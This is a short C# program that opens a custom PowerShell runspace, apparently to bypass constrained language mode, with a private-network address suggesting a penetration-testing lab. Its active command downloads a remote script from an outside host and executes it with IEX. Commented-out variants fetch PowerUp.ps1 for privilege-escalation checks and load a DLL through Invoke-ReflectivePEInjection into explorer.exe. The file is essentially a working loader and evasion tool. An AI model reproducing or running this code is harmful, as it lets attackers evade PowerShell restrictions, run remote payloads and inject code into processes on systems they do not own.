using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CreateRunspace
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            String cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152/rtsd12_ps.txt')";
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.159:8000/mfe.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.159:8000/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
